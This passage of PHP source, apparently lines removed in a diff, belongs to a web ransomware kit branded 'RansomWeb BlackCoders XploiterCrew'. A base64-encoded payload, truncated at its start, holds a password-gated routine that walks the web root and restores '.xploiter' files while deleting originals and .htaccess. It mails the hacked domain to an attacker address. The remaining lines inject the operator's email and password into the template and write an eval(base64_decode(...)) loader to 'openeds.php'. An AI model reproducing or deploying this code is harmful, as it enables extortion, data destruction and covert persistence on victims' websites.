m9ueW1vdXMiPjwvc2NyaXB0Pg0KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL3N0YWNrcGF0aC5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjEuMy9qcy9ib290c3RyYXAubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1DaGZxcXh1WlVDbkpTSzMrTVhtUE5JeUU2WmJXaDJJTXFFMjQxcllpcUp4eU1pWjZPVy9KbVpRNXN0d0VVTFR5IiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4NCiAgPC9ib2R5Pg0KPC9odG1sPg0KPD9waHANCiRwYXNzID0gIkhhY2tlZCI7IC8vIFBhc3N3b3JkIERlZmF1bHQNCiRtYWlsID0gImFrdWhla2VyQHBlcm8uY29tIjsNCiRkcHMgID0gImlraXNrcmlwa3V4Y29rIjsNCmlmKGlzc2V0KCRfUE9TVFsicGFzcyJdKSl7DQoJaWYobWQ1KCRfUE9TVFsicGFzcyJdKSA9PSAkcGFzcyl7DQoJCWZ1bmN0aW9uIEJ1a2FGaWxlKCROYW1hRmlsZSl7DQoJCQlpZihzdHJwb3MoJE5hbWFGaWxlLCcueHBsb2l0ZXInKSA9PT0gRkFMU0Upew0KCQkJCXJldHVybjsgLy8gS2VtYmFsaWthbiENCgkJCX0NCiRCdWthID0gZ3ppbmZsYXRlKGZpbGVfZ2V0X2NvbnRlbnRzKCROYW1hRmlsZSkpOw0KZmlsZV9wdXRfY29udGVudHMoc3RyX3JlcGxhY2UoJy54cGxvaXRlcicsICcnLCAkTmFtYUZpbGUpLCAkQnVrYSk7DQoNCi8vIEhhcHVzIEZpbGUNCnVubGluaygnLmh0YWNjZXNzJyk7DQp1bmxpbmsoJE5hbWFGaWxlKTsNCg0KZWNobyAiJE5hbWFGaWxlID0+IFRlcmJ1a2FcbiI7DQoJCX0NCgkJDQplY2hvICI8aHI+DQo8Y2VudGVyPg0KPHAgY2xhc3M9J3RleHQtbGlnaHQnPlVubG9jayBGaWxlPC9wPg0KPC9jZW50ZXI+DQo8dGV4dGFyZWEgY2xhc3M9J2Zvcm0tY29udHJvbCB0ZXh0LWRhcmsnIGRpc2FibGVkIHJvd3M9JzgnPiI7DQoNCgkJZnVuY3Rpb24gQnVrYURpcigkZGlyKXsNCgkJCSRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7DQoJCQlmb3JlYWNoKCRmaWxlcyBhcyAka2V5KXsNCgkJCQlpZihpc19kaXIoJGRpci4iLyIuJGtleSkpew0KCQkJCQlCdWthRGlyKCRkaXIuIi8iLiRrZXkpOw0KCQkJCX1lbHNlew0KCQkJCQlCdWthRmlsZSgkZGlyLiIvIi4ka2V5KTsNCgkJCQl9DQoJCQl9DQoJCX0NCgkJQnVrYURpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsNCgkJdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsNCgkJdW5saW5rKCdvcGVuZWRzLnBocCcpOw0KCQl1bmxpbmsoJy5odGFjY2VzcycpOw0KCQljb3B5KCcuaHRhY2Nlc3MoQmFja1VwKScsJy5odGFjY2VzcycpOw0KCQl1bmxpbmsoJy5odGFjY2VzcyhCYWNrVXApJyk7DQoNCiR1bnR1ayAgID0gJG1haWw7DQokc3ViamVjdCA9ICJSYW5zb21XZWIgQmxhY2tDb2RlcnMgWHBsb2l0ZXJDcmV3IjsNCiRoZWFkZXJzID0gIlshXSBSYW5zb21XZWIgQmxhY2tDb2RlcnMgWHBsb2l0ZXJDcmV3IFshXSI7DQokd2Vic2l0ZSA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsNCiRwZXNhbiAgID0gIk5hbWEgRG9tYWluIDogIi4kd2Vic2l0ZS4iXG5UZXJidWthIFBhZGEgOiAiLmRhdGUoJ2wsIGQtTS1ZJykuIlxuU2NyaXB0IERlZmFjZSA6IGh0dHA6Ly8iLiR3ZWJzaXRlLiIvIi4kZHBzLiJcblxuVGhhbmtzIERhaCBNZW5nZ3VuYWthbiBSYW5zb20gS2FtaTopIjsNCm1haWwoJHVudHVrLCRzdWJqZWN0LCRwZXNhbiwkaGVhZGVycyk7DQoJDQplY2hvICI8L3RleHRhcmVhPg0KPHNjcmlwdD4NCnByb21wdCgnU3Vrc2VzIE1lbWJ1a2EgU2VtdWEgRmlsZScsZG9jdW1lbnQuZG9tYWluKTsNCjwvc2NyaXB0PiI7DQoJfWVsc2V7DQoJCWVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1Bhc3N3b3JkIFRpZGFrIENvY29rJyk8L3NjcmlwdD4iOw0KCX0NCglleGl0Ow0KfQ0KPz4=");
-$mx = str_replace("akuheker@pero.com", $_POST["msg"], $x);
-$y = str_replace("Hacked", md5($_POST["pass"]), $mx);
-$xyz = str_replace("ikiskripkuxcok", $nama_file, $y);
-$z = "<?php eval('?>'.base64_decode("."'".base64_encode($xyz)."'".").'<?php '); ?>";
-$xy = fopen('openeds.php','w');
-			fwrite($xy, $z);
-			fclose($xy);
-
-
-/* Done */
-	
-echo "</textarea>
-<script>
-prompt('Sukses Mengunci Semua File',document.domain);
-</script>";
-	}
-}
-?>
